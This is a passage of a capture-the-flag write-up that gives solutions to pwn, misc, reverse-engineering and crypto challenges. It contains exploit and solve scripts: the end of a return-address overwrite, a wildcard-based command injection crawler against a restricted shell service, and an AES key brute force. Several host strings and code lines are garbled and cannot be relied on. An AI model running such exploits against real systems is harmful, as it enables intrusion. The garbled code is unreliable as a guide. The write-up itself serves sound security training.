    overwrite(retaddr + i * 8, u64(chunk))
sla(b'>> ', b'3')
com()
```

### ![images](https://hackmd.io/_uploads/rJgZ-HH06.png)

Flag: `ENO{WA1T_WHAT_H0W_D1D_Y0U_F1ND_M3???}`

# Misc

## missingcat

> Missing cat \
> Where is my cat? \
> **Author:** @gehaxelt \
> **Connection: 52**.59.124.14:5001\*\* > **Attachment:** chall.py

Given a challenge with the following source:
![images](https://hackmd.io/_uploads/ryOgBxUA6.png)

Although there is an initial check, the command below will still be executed so we just enter the command that outputs the contents of the flag.txt file, which is tac or cat (The intended one using nl actually).

### ![images](https://hackmd.io/_uploads/SJ9gExIAp.png)

Flag: `ENO{0xCAT_BUT_H4PP1_THANK_Y0U!}`

## Lost in Parity

> Lost in Parity \
> I deleted the flag. \
>
> > python3 xor.py ./f\* > xor \
> > rm xor.py flag.txt \
> > **Author:** @miko \
> > **Attachment:** data.zip

We are given a data.zip file containing 256 files named `file0` to `file255` and another file `xor`. From the description, we can asume that the `xor` file is the result of xor-ing those 256 files and also the flag.txt. Knowing that in mind, we can recover the flag.txt from xor-ing `file0` until `file255` and also `xor`.

#### POC

```python
#!/usr/bin/env python3

from pwn import xor
from os import listdir

files = [file for file in listdir() if file != 'solve.py']
flag = b''
for file in files:
    file = open(file, 'rb').read()
    flag = xor(flag, file)

print(flag)
```

Flag: `ENO{R41D1NG_F1L3S_4R3_W3?}`

## Itchy Route

> Itchy Route \
> Get straight to the point and list your options! \
> **Author:** @miko \
> **Conn:** 52.59.124.14:5002

Given an IP address and the port that we can connect using `nc`. Once connected to it, we won't see anything, but after we give an input, it will give us a message.

### ![images](https://hackmd.io/_uploads/HJp1oxUAp.png)

After experimenting with it, i found out that almost all the characters have been banned. So our initial step is to find out what characters are allowed.

#### Characters that are allowed

```python
import string

whitelist = []
for c in string.printable:
    io = remote("Connection: 52**.59.124.14", 500
    io.sendline(c.encode())
    if b"illegal" not in io.recvline():
        whitelist.append(c)
    io.close()

print(whitelist)
```

Using the script above, we get the allowed characters are `0cnCN./?`. So, after that, i test some characters and while testing `.` character, i came to realization that the server was executing `ls` command.

### ![images](https://hackmd.io/_uploads/rk0ay-LCT.png)

When i input `0cn` to the server, the server tells us what to do. We have to look for another folder named `0cn` in the filesystem with the restriction that we can only use a few characters.

Fortunately, one of the allowed characters are `?`. On unix shells such as bash, `?` character is used for wildcard that matches a single character. So, we will replace all illegal characters with `?` character. Finally, we can use DFS or BFS to search the directory.

#### POC

```python
#!/usr/bin/env python3

from pwn import *


def replace_blacklisted(s):
    res = b""
    for b in s:
        if b not in whitelist:
            res += b"?"
        else:
            res += bytes([b])
    return res


whitelist = b"0cnCN./?"


paths = [b"."]

context.log_level = "WARN"
prog = log.progress("Current path", level=logging.WARN)
for path in paths:
    prog.status(path.decode())
    io = remote("Connection: 52**.59.124.14", 500
    io.sendline(replace_blacklisted(path))
    resp = io.recvall()
    if b"ENO" not in resp:
        if b"Cannot access" not in resp:
            for p in resp.split(b"\n"):
                if p != b"":
                    paths.append(path + b"/" + p)
    else:
        log.warn(f"Flag: {resp.decode()}")
        prog.success(path.decode())
        break

```

I got the flag after a few minutes.

### ![images](https://hackmd.io/_uploads/HkpKQWLCp.png)

Flag: `ENO{4NY_M0R3_QU35T10N5M4RK5_0C?N?}`

# Rev

## revhell

> Step into the shadows of the Forbidden Realms, a realm shrouded in mystery. To breach its gates, one must whisper the correct incantation, a secret phrase concealed in the echoes of darkness that is filled with strange sorcery (the so called fun). \
> **Author:** @moaath, @anajana \
> **Attachment:** revhell

Given a binary file named `revhell`. The first step i do is looking the disassembly in IDA.

#### main

```c
__int64 sub_401923()
{
  __int64 result; // rax
  char *v1; // [rsp+8h] [rbp-48h]
  char s[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  setvbuf(stream, 0LL, 2, 0LL);
  setvbuf(off_4C56E8, 0LL, 2, 0LL);
  setvbuf(off_4C56F8, 0LL, 2, 0LL);
  puts("Welcome to my secret chamber!");
  puts("You are one step away from victory!");
  puts("Enter the secret phrase to pass through.");
  printf(">> ");
  v1 = fgets(s, 44, off_4C56F8);
  v1[(int)strlen(v1)] = 0;
  if ( (unsigned int)sub_4017E5(s) )
    puts("You guessed the phrase correctly - Welcome to hell!");
  else
    puts("You have failed - you're not worthy.");
  result = 0LL;
  if ( v3 != __readfsqword(0x28u) )
    sub_453640();
  return result;
}
```

The main function asks us for 44 bytes worth of input, including a newline. Then, the program will check our input. If it's the correct flag, the program will confirm that it's correct and vice versa. Let's see what happened in the check input function.

#### check input

```c
__int64 __fastcall sub_4017E5(const char *a1)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-74h]
  __int64 v3[5]; // [rsp+20h] [rbp-70h]
  int v4; // [rsp+48h] [rbp-48h]
  __int64 v5[5]; // [rsp+50h] [rbp-40h]
  int v6; // [rsp+78h] [rbp-18h]
  unsigned __int64 v7; // [rsp+88h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v3[0] = 0xD709E809866BC599LL;
  v3[1] = 0xD312870001F8008ALL;
  v3[2] = 0x4F23C8505EC528D7LL;
  v3[3] = 0xAC86E7D3F57F26BDLL;
  v3[4] = 0xC33660B6B8168BC7LL;
  v4 = 0xF80C8A;
  v5[0] = 0xB279D861FD248BDCLL;
  v5[1] = 0xB726EF5F74C879D5LL;
  v5[2] = 0x3B5BAD0F30B04E88LL;
  v5[3] = 0xCBE8D6A7961E12CFLL;
  v5[4] = 0xB15505C5E76FE698LL;
  v6 = 0x8578EF;
  if ( strlen(a1) == 43 )
  {
    for ( i = 0; i <= 43; ++i )
    {
      if ( (*((_BYTE *)v3 + i) ^ a1[i]) != *((_BYTE *)v5 + i) )
      {
        result = 0LL;
        goto LABEL_9;
      }
    }
    result = 1LL;
  }
  else
  {
    result = 0LL;
  }
LABEL_9:
  if ( v7 != __readfsqword(0x28u) )
    sub_453640();
  return result;
}
```

The function simply xor our input with a key and then check if it's equal to the secret. So, we can simply xor the key and the secret to get the flag.

#### POC

```python
#!/usr/bin/env python3

from pwn import xor, p64


s1 = b""
s1 += p64(0xD709E809866BC599)
s1 += p64(0xD312870001F8008A)
s1 += p64(0x4F23C8505EC528D7)
s1 += p64(0xAC86E7D3F57F26BD)
s1 += p64(0xC33660B6B8168BC7)
s1 += p64(0xF80C8A).strip(b"\0")

s2 = b""
s2 += p64(0xB279D861FD248BDC)
s2 += p64(0xB726EF5F74C879D5)
s2 += p64(0x3B5BAD0F30B04E88)
s2 += p64(0xCBE8D6A7961E12CF)
s2 += p64(0xB15505C5E76FE698)
s2 += p64(0x8578EF).strip(b"\0")

print(xor(s1, s2).decode())
```

### ![images](https://hackmd.io/_uploads/r1OC5-U06.png)

Flag: `ENO{h0pe_y0u_h4d_fun_extr4act1ng_my_secret}`

## CarryMe

> Let me carry your negative energy away my friend. \
> **Authors:** @moaath, @Liikt \
> FLAG hash: 4806d466d3b96fcbc18d050aa9b925d6aa6b4b711167a5b9092efcfba5d7f352 (echo -n "flag" I sha256sum)

In this challenge, we were given a binary file named `carryme`. Disassemble it in IDA to find out what it does.

#### main

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  const char *v4; // [rsp+8h] [rbp-38h]
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("You look hurt :(");
  puts("Let us carry the negative weight away from you");
  puts("Provide the secret code.");
  printf(">> ");
  v4 = fgets(s, 34, stdin);
  v4[(int)strlen(v4)] = 0;
  if ( (unsigned int)sub_121E(s) )
    puts("Thank you!. Let us take the weight now...");
  else
    puts("Wrong code. Sry but looks like we can't take the weight away from you");
  return 0LL;
}
```

The main function asks us for 34 bytes worth of input, including a newline. After that, it will check the input using function called `sub_121E`. Let's see what it does.

#### check input

```c
__int64 __fastcall sub_121E(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( strlen(a1) != 33 )
    return 0LL;
  for ( i = 0; i <= 33; ++i )
  {
    if ( ((unsigned __int8)sub_11E9((unsigned int)a1[i], (unsigned int)i) ^ (unsigned __int8)byte_4060[i]) != byte_40A0[i] )
      return 0LL;
  }
  return 1LL;
}

__int64 __fastcall sub_11E9(__int64 a1, __int64 a2)
{
  return ~(-(__int64)((byte_4020[a2] & 4) != 0LL) & 6) & a1;
}

.data:0000000000004020 byte_4020       db 34h, 5Ch, 17h, 0B7h, 77h, 2Bh, 0A0h, 2Ch, 0B5h, 84h
.data:0000000000004020                                         ; DATA XREF: sub_11E9+4↑o
.data:000000000000402A                 db 34h, 30h, 0A2h, 8Bh, 75h, 51h, 74h, 0BBh, 0ADh, 6Fh
.data:0000000000004034                 db 8Eh, 0F9h, 5Ah, 0Fh, 0CBh, 83h, 72h, 38h, 0ADh, 0D9h
.data:000000000000403E                 db 0CEh, 0E2h, 35h, 0E5h, 1Eh dup(0)
.data:0000000000004060 ; char byte_4060[33]
.data:0000000000004060 byte_4060       db 99h, 0ACh, 10h, 39h, 0D9h, 0C5h, 0BEh, 0Dh, 0F5h, 60h
.data:0000000000004060                                         ; DATA XREF: sub_121E+59↑o
.data:000000000000406A                 db 98h, 6Bh, 0B1h, 0Ch, 26h, 5Fh, 7Bh, 0B4h, 58h, 0D6h
.data:0000000000004074                 db 0C4h, 24h, 59h, 36h, 5Ch, 6, 0Fh, 2Ah, 0E8h, 44h, 0Fh
.data:000000000000407F                 db 81h, 0F1h, 1Fh, 1Eh dup(0)
.data:00000000000040A0 ; char byte_40A0[33]
.data:00000000000040A0 byte_40A0       db 0D8h, 0E4h, 59h, 40h, 91h, 0F5h, 0E9h, 54h, 0A5h, 28h
.data:00000000000040A0                                         ; DATA XREF: sub_121E+6E↑o
.data:00000000000040AA                 db 0D9h, 3Fh, 96h, 39h, 7Fh, 6Ah, 4Bh, 0F9h, 69h, 8Fh
.data:00000000000040B4                 db 8Ch, 17h, 1, 66h, 3, 4Ah, 59h, 66h, 0B1h, 17h, 4Fh
.data:00000000000040BF                 db 0C3h, 88h, 1Fh
```

It seems that the function will xor each byte of our input with a key, but before that, the byte processed in `sub_11E9`. To solve this challenge, i initially use z3 solver, but the solution is not unique. The author gave us the sha256 hash of the flag for us to know that our flag is correct. So my approach is to gather all possible character in every index of the flag, then use cartesian product to produce all possible flag and iterate over it to check whether it's the correct flag. I also use `multiprocessing` to process it faster.

#### POC

```python
#!/usr/bin/env python3

from z3 import *
from hashlib import sha256
from itertools import product
import multiprocessing
import string

flag_chars = [BitVec(f"flag_{i}", 8) for i in range(33)]

# fmt: off
byte_4020 = [
    0x34, 0x5C, 0x17, 0xB7, 0x77, 0x2B, 0xA0, 0x2C, 0xB5, 0x84,
    0x34, 0x30, 0xA2, 0x8B, 0x75, 0x51, 0x74, 0xBB, 0xAD, 0x6F,
    0x8E, 0xF9, 0x5A, 0x0F, 0xCB, 0x83, 0x72, 0x38, 0xAD, 0xD9,
    0xCE, 0xE2, 0x35, 0xE5,
]
byte_4060 = [
    0x99, 0xAC, 0x10, 0x39, 0xD9, 0xC5, 0xBE, 0x0D, 0xF5, 0x60,
    0x98, 0x6B, 0xB1, 0x0C, 0x26, 0x5F, 0x7B, 0xB4, 0x58, 0xD6,
    0xC4, 0x24, 0x59, 0x36, 0x5C, 0x06, 0x0F, 0x2A, 0xE8, 0x44,
    0x0F, 0x81, 0xF1, 0x1F,
]
byte_40A0= [
    0xD8, 0xE4, 0x59, 0x40, 0x91, 0xF5, 0xE9, 0x54, 0xA5, 0x28,
    0xD9, 0x3F, 0x96, 0x39, 0x7F, 0x6A, 0x4B, 0xF9, 0x69, 0x8F,
    0x8C, 0x17, 0x01, 0x66, 0x03, 0x4A, 0x59, 0x66, 0xB1, 0x17,
    0x4F, 0xC3, 0x88, 0x1F,
]
# fmt: on


def sub_11E9(a1, a2):
    return ~(-((byte_4020[a2] & 4) != 0) & 6) & a1


CHARSET = string.ascii_uppercase + string.digits + "{}_'@"

possible_value = [[] for i in range(len(flag_chars))]
for i, c in enumerate(flag_chars):
    s = Solver()
    match i:
        case 0:
            s.add(c == ord("E"))
        case 1:
            s.add(c == ord("N"))
        case 2:
            s.add(c == ord("O"))
        case 3:
            s.add(c == ord("{"))
        case 32:
            s.add(c == ord("}"))
        case _:
            s.add(Or(*[c == ord(k) for k in CHARSET]))
    s.add(sub_11E9(c, i) ^ byte_4060[i] == byte_40A0[i])
    while s.check() == sat:
        possible_value[i].append(chr(s.model()[c].as_long()))
        s.add(c != s.model()[c])


def calculate_hash(s):
    s = "".join(s)
    return s, sha256(s.encode()).hexdigest()


pool = multiprocessing.Pool(multiprocessing.cpu_count())
for flag, hash in pool.imap_unordered(
    calculate_hash, product(*possible_value), chunksize=1000
):
    if hash == "4806d466d3b96fcbc18d050aa9b925d6aa6b4b711167a5b9092efcfba5d7f352":
        print(flag)
        exit()
```

### ![images](https://hackmd.io/_uploads/SJjACW80T.png)

Flag: `ENO{N0W_THAT'5_50M3_N3XT_LVL_SBB}`

## cursedPower

> AHHH The field is full of mines! Screw it! I am going in! \
> **Author:** @moaath, @Liikt \
> **Attachment:** script.ps1

In this challenge, we were presented with an obfuscated PowerShell script. Malicious actors frequently employ obfuscation methods to obscure the contents of their PowerShell payloads, making it more difficult to analyze them effectively. One well-known example of this is Cobalt Strike. To analyze such scripts dynamically, tools like Power-Decode can be utilized. You can find the tools [here](https://github.com/Malandrone/PowerDecode).

#### POC

After running GUI.ps1, we select the automatically decode mode and input the file containing the obfuscated powershell payload. We can see that the flags are defined in the $flag variable.

### ![images](https://hackmd.io/_uploads/B1hGP1ICa.png)

Flag: `ENO{H0p3fully_Y0ur_M1ND_D1D_G3t_scr3w3D}`

# Crypto

## double-trouble

> What can be better than a Crypto challenge? (kinda anything 101) \
> A Crypto challenge written in Rust! its double the fun ;) \
> **Author:** @layton, @anajana, @moaath \
> **Connection: 52**.59.124.14:5024\*\* > **Attachment:** source.zip

In this challenge, we were given a server-side file that is a Rust project and a Dockerfile inside of zip file. First let's see what the program do.

```rust
use std::io::Write;

use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm,
};

const Flag: &str = "ENO{repl4c3_m3}";

fn encrypt(message: &[u8], key: &[u8]) -> Vec<u8> {
    message
        .iter()
        .enumerate()
        .map(|(i, m)| m ^ key[i % 32])
        .collect()
}

fn main() {
    let key = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);

    let encrypted = cipher.encrypt(&nonce, Flag.as_ref()).unwrap();

    println!(
        "Ciphertext: 0x{}",
        hex::encode(&nonce),
        hex::encode(&encrypted)
    );

    let mut message = String::new();
    print!("Let me encrypt one more thing for you: ");
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut message).unwrap();

    if message.len() > 29 {
        println!("Woah! That's too long for me :^)");
        return;
    }

    println!("0x{}", hex::encode(encrypt(message.as_ref(), key.as_ref())));
}
```

In that code, the program encrypts the flag using AES256-GCM with a random key and nonce. It then takes input with a length of no more than 29 characters. The flag is encrypted using an `encrypt` function, where the function simply performs a XOR operation on the two parameters, where the parameters are the key and the input.

So what we will do is, send a 29-length input message, then receive the ciphertext. Next we can XOR the ciphertext with the plaintext to obtain the 29 bytes of the key. And for the next 3 bytes, we can simply brute force it.

#### POC

```python
from itertools import product

from Crypto.Cipher import AES
from Crypto.Util.number import *
from pwn import *
from tqdm import tqdm

# nc Connection:** 52.59.124.14 50
HOST = **"Connection: 52.59.124.1
PORT = 5024

msg = b"A" * 28 + b"\n"

io = remote(HOST, PORT)

io.recvuntil(b"Ciphertext: 0x")
c = bytes.fromhex(io.recvline().strip().decode())

nonce = c[:12]
ct = c[12:]
log.info(f"nonce: {nonce.hex()}")
log.info(f"ct: {ct.hex()}")

io.sendafter(b"Let me encrypt one more thing for you: ", msg)

io.recvuntil(b"0x")
_key = xor(bytes.fromhex(io.recvline().strip().decode()), msg)
log.info(f"partial key: {_key.hex()}")

for k in tqdm(product(range(0x100), repeat=3), total=0x100**3):
    key = _key + bytes(k)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

    _m = cipher.decrypt(ct)
    if b"ENO{" in _m:
        print(_m)
        break
```

### ![images](https://hackmd.io/_uploads/BywY9iSCT.png)

Flag: `ENO{otp_reuse_rethink_rewind}`
